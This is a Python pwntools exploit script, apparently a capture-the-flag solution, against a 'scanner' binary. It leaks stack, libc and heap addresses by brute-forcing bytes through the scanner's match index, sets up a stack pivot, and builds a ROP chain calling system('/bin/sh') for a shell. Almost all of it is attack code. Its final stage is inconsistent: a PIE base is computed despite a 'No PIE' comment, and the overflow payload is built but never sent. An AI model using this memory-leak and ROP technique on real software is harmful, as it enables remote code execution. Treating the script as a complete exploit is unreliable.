#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./binary --host 127.0.0.1 --port 1234
from pwn import *

# Set up pwntools for the correct architecture
exe = ELF("./scanner_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.31.so")

context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

if exe.bits == 32:
    lindbg = "/root/linux_server32"
else:
    lindbg = "/root/linux_server"

def hi(io):
    import subprocess
    result = subprocess.run(['python3', '/root/Documents/tools/heapinspect/HeapInspect.py', str(io.pid)], capture_output=True, text=True)
    print(result.stdout)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR
# ./exploit.py GDB HOST=example.com PORT=4141
host = args.HOST or '127.0.0.1'
port = int(args.PORT or 1234)

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.EDB:
        return process(['edb', '--run', exe.path] + argv, *a, **kw)
    elif args.QIRA:
        return process(['qira', exe.path] + argv, *a, **kw)
    elif args.IDA:
        return process([lindbg], *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX disabled
# PIE:      No PIE (0x400000)
# RWX:      Has RWX segments

io = start()

from typing import *

def send_choice(choice: int) -> None:
    """Synchronize with the menu and submit a selection."""
    io.recvuntil(b'> ')
    io.sendline(str(choice).encode())

def update_buffer(payload: bytes) -> None:
    """Install controlled data into the 4 KiB scanner buffer."""
    send_choice(1)
    io.recvuntil(b'Enter new buffer: ')
    io.send(payload)
    if not payload.endswith(b'\n'):
        io.send(b'\n')

def run_pattern(pattern: bytes) -> Optional[int]:
    """Invoke the naïve scanner with a custom pattern; return the reported index or None."""
    assert len(pattern) == 0x1000, "scanner expects a 4096-byte pattern"
    send_choice(3)
    io.recvuntil(b'Enter parameters: ')
    io.sendline(b'naive1 %d' % len(pattern))
    io.send(pattern)
    io.send(b'\n')  # satisfy the getchar() after fread()
    line = io.recvline()
    if b'Found at i=' in line:
        return int(line.strip().split(b'=')[1])
    return None

def build_prefix(offset: int, leaked: bytes) -> bytes:
    """Construct the first 4095 bytes so the match occurs at i == 1 + offset."""
    prefix = bytearray(0xFFF)
    for j in range(len(prefix)):
        pos = 1 + offset + j
        if pos <= 0:
            prefix[j] = ord('B')  # unreachable, but keeps intent clear
        elif pos <= 0xFFE:
            prefix[j] = ord('A')
        elif pos == 0xFFF:
            prefix[j] = 0
        else:
            prefix[j] = leaked[pos - 0x1000]
    return bytes(prefix)

def leak_byte(offset: int, leaked: bytearray) -> int:
    """Brute-force the byte at s[0x1000 + offset] and return its value."""
    prefix = build_prefix(offset, leaked)
    target_index = 1 + offset
    attempt = log.progress(f'leaking byte {offset}')
    for guess in range(0x100):
        pattern = prefix + bytes([guess])
        idx = run_pattern(pattern)
        if idx == target_index:
            attempt.success(f'0x{guess:02x}')
            return guess
    attempt.failure('exhausted guesses')
    raise RuntimeError(f'failed to leak byte at offset {offset}')

# prime the buffer so positions 1..0xFFE are 'A' and s[0] is unique
update_buffer(b'B' + b'A' * 0xFFE + b'\n')

bytes_to_leak = 0x48
leaked = bytearray()

for off in range(bytes_to_leak):
    value = leak_byte(off, leaked)
    leaked.append(value)

for idx in range(0, len(leaked), 8):
    chunk = leaked[idx : idx + 8]
    addr = u64(chunk)
    log.info(f'offset {idx:02d}: {chunk.hex()} -> 0x{addr:016x}')

saved_rbp   = u64(leaked[0x00:0x08])
saved_rip   = u64(leaked[0x40:0x48])     # pick the one inside scanner_patched
pie_base    = saved_rip - 0x1950  # adjust symbol to whichever you matched
libc_leak   = u64(leaked[0x18:0x20])
heap_ptr = u64(leaked[0x38:0x40])
libc_base = libc_leak - 147587  # adjust to your libc

exe.address  = pie_base
libc.address = libc_base

log.warn(f'EXE.ADDRESS -> {pie_base:x}')
log.warn(f'LIBC.ADDRESS -> {libc.address:x}')
log.warn(f'HEAP PTR -> {heap_ptr:x}')

stack_low = saved_rbp & 0xff
pivot_rbp = saved_rbp & ~0xff
buf_base  = saved_rbp - 0x1010
pivot_off = pivot_rbp - buf_base
var4_off  = 0x1010 - (stack_low + 4)
var8_off  = 0x1010 - (stack_low + 8)
ptr_off   = 0x1010 - (stack_low + 0x10)
ret_off   = stack_low - 8

stage = bytearray(b'A' * 0x1000)
stage[var4_off:var4_off+4] = p32(0)              # scanner index
stage[var8_off:var8_off+4] = p32(1)              # pattern size
stage[ptr_off:ptr_off+8]   = p64(heap_ptr)       # real heap chunk so free() survives

pause()

log.warn(f'stage -> {stage}\nlength -> {len(stage)}')

io.sendlineafter(b'> ', b'1')
io.sendafter(b'Enter new buffer: ', bytes(stage))

pause()

io.sendlineafter(b'> ', b'3')
io.sendlineafter(b'Enter parameters: ', b'naive1AAAAAAAA 1')
io.send(b'Z')
io.send(b'\n')
io.recvline()                                    # “Invalid scanner!” (exit avoided thanks to locals)

rop = ROP(libc)

ret_align = rop.find_gadget(['ret']).address
pop_rdi   = rop.find_gadget(['pop rdi', 'ret']).address
bin_sh    = next(libc.search(b'/bin/sh\x00'))
system    = libc.sym['system']

log.warn(f'{ret_align:x}\n{pop_rdi:x}\n{bin_sh:x}\n{system:x}')

io.sendlineafter(b'> ', b'1')
overflow  = b'B' * ret_off
overflow += p64(ret_align)
overflow += p64(pop_rdi)
overflow += p64(bin_sh)
overflow += p64(system)

io.interactive()